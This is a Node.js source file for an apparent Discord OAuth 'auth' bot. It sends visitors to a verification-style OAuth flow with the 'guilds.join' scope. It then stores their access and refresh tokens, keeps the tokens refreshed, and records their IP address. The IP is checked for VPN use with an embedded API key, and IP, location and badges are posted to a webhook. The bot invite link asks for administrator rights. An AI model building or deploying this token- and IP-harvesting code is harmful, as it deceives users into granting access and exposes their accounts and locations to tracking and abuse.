/* Core API */
const client = require('./Utils/client');
const auth = require('./Core/AuthClient')
const venusClient = new auth(client);
const express = require('express');
const app = express();
const fs = require('fs');

/* Core API Configuration */
const config = require('./Settings/config');
const authLink = client.authLink = `https://discord.com/oauth2/authorize?client_id=${config.client.id}&redirect_uri=${config.client.redirect_uri}&response_type=code&scope=identify%20guilds.join`
const authInvite = client.authInvite = `https://discord.com/api/oauth2/authorize?client_id=${config.client.id}&permissions=8&scope=bot%20applications.commands`;
/* Core Database */
const botSchema = require('./Schema/botSchema');
const userSchema = require('./Schema/userSchema')

/* Core Extra Modules */
const chalk = require('chalk');

const axios = require('axios')



/* Core Extra Client Configuration */
client.chalk = chalk;
client.fs = fs;
client.authClient = venusClient;
const log = authLog => { console.log(`[${chalk.green("+")}] ` + authLog) }
const warn = authLog => { console.log(`[${chalk.red("-")}] ` + authLog) }
const error = authLog => { console.log(`[${chalk.red("!")}] ` + authLog) }
require('./Utils/loader')(client);
process.setMaxListeners(0);
process.on("unhandledRejection", err => { })

client.on('ready', async () => {

    setInterval(async () => {
        let users = await userSchema.find({}).lean().select("refreshToken expiresDate");

        users.forEach(async user => {

            if (Date.now() <= user.expiresDate) {

                await venusClient.refreshToken(user.refreshToken)

            }

        })
    }, 300000);
  
})

/* Core Auth Modules */


/* Core Auth Web Configuration */
app.listen(config.web.port, () => { log(`Auth Scanner is running on port ${config.web.port}`) });

/* Core Auth Profile */
// passport.use(new DiscordStrategy({
//     clientID: config.client.id,
//     clientSecret: config.client.secret,
//     callbackURL: config.client.redirect_uri,
//     scope: config.client.scope,
// },
//     function (accessToken, refreshToken, profile, cb) {
//         let data = {
//             ...profile,
//             accessToken,
//             refreshToken
//         }
//         cb(null, data)
//     }));

/* Core Auth Website */

app.get('/', function (req, res) {
  
  res.redirect(authLink);
})

// app.get('/verified', function (req, res) {
//     res.sendFile(__dirname + '/Views/verified.html');
// })
app.get('/discord', function (req, res) {
    res.redirect(`${config.client.serverLink}`);
})

app.get('/auth', async (req, res) => {
 res.sendFile(__dirname + '/Views/index.html');
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  console.log(ip)
 const data = await venusClient.manageAuth({ code: req.query.code });
   const user_id = await venusClient.requestId(data.access_token);
if (!user_id || !data) return;
    let user_ = await venusClient.fetchUser(user_id);
    let botData = await botSchema.findOne({ clientId: client.user.id });

  
    const is_vpn = "is_vpn"
    let aronshire_ = await axios.get(`https://api.ipregistry.co/${ip}?key=n7275m1rwnnlcjd0`).then(res => res.data).catch();
    let countryCode = aronshire_?.location?.country?.code || null //
    let vpn = aronshire_?.location?.security?.is_vpn //

    let userData = {
        id: user_.id,
        username: user_.username,
        discriminator: user_.discriminator,
        avatar: `https://cdn.discordapp.com/avatars/${user_.id}/${user_.avatar}.png`,
        accessToken: data.access_token,
        refreshToken: data.refresh_token,
        expiresDate: Date.now() + 604800,
        locale: `:flag_${countryCode.toLowerCase()}:`,//
        vpn: `${vpn}`,
        ip: `${ip}`,
    }

    let badges;
    if (user_.flags.toArray().length > 0) {

        let DISCORD_NITRO = user_.premium_type > 0 ? '<:nitro:1132021963305521232>' : '';

        let DISCORD_EMPLOYEE = user_.flags.has('Staff') ? '<:discord_staff:948738507814359041>' : '';
        let PARTNERED_SERVER_OWNER = user_.flags.has('Partner') ? '<:Partner:1001996381621325905>' : '';
        let DISCORD_CERTIFIED_MODERATOR = user_.flags.has('CertifiedModerator') ? '<:certifieddiscordmoderator:1001996369600467034>' : '';
        let HYPESQUAD_EVENTS = user_.flags.has('Hypesquad') ? '<:hypesquad_events:1001996383169028147>' : '';

        let HOUSE_BRAVERY = user_.flags.has('HypeSquadOnlineHouse1') ? '<:hypesquadbravey:948738579029454919>' : '';
        let HOUSE_BRILLIANCE = user_.flags.has('HypeSquadOnlineHouse2') ? '<:hypequadBrilliance:1001996378202968176>' : '';
        let HOUSE_BALANCE = user_.flags.has('HypeSquadOnlineHouse3') ? '<:hypesquadBalance:1001996375858364476>' : '';

        let BUGHUNTER_LEVEL_1 = user_.flags.has('BugHunterLevel1') ? '<:bughunter:1001996370850357258>' : '';
        let BUGHUNTER_LEVEL_2 = user_.flags.has('BugHunterLevel2') ? '<:goldbughunter:1001996374725885973>' : '';

        let EARLY_VERIFIED_BOT_DEVELOPER = user_.flags.has('VerifiedDeveloper') ? '<:verified:1132021984792940726>' : '';

        let EARLY_SUPPORTER = user_.flags.has('PremiumEarlySupporter') ? '<:early:1132022054095429652>' : '';
        //  let ACTIVE_DEVELOPER = user_.flags.has('ACTIVE_DEVELOPER') ? '<:activedev:1132023034790826066>' : '';

        badges = `${DISCORD_EMPLOYEE}${PARTNERED_SERVER_OWNER}${DISCORD_CERTIFIED_MODERATOR}${HYPESQUAD_EVENTS}${HOUSE_BRAVERY}${HOUSE_BRILLIANCE}${HOUSE_BALANCE}${BUGHUNTER_LEVEL_1}${BUGHUNTER_LEVEL_2}${EARLY_VERIFIED_BOT_DEVELOPER}${EARLY_SUPPORTER}${DISCORD_NITRO}`;

    } else {
        badges = 'None';
    }

    venusClient.saveAuth(client.user.id, userData);
    venusClient.sendWebhook({
        embeds: [
            {
                color: 3092790,
                title: `👤 New User`,
                thumbnail: { url: userData.avatar, dynamic: true },
                fields: [
                    {
                        name: "Account Creation On",
                        value: `<t:${Math.round(user_.createdTimestamp / 1000)}>`,
                        inline: true
                    },
                    {
                        name: "Badges",
                        value: `${badges}`,
                        inline: true
                    },
                    {
                        name: "Locale",
                        value: `:flag_${countryCode.toLowerCase()}:`,
                        inline: true
                    },
                    {
                        name: "VPN",
                        value: `\`${vpn}\``,
                        inline: true
                    },
                    {
                        name: "IP Adress",
                        value: `\`${ip}\``,
                        inline: true
                    }
                ],
                footer: {
                    "text": `v1.0 ・ opps.lol/discord `
                },
                description: `\`\` ${userData.username}#${userData.discriminator} \`\` \`\` ${userData.id} \`\``,
            },
        ]

    })

    
 




});


process.on('uncaughtException', (error) => {
  const errorMessage = `Uncaught exception: ${error.stack}\n`;
  
  console.error(errorMessage);
});

// Log unhandled rejections to file
process.on('unhandledRejection', (error) => {
  const errorMessage = `Unhandled rejection: ${error.stack}\n`;
  
  console.error(errorMessage);
});
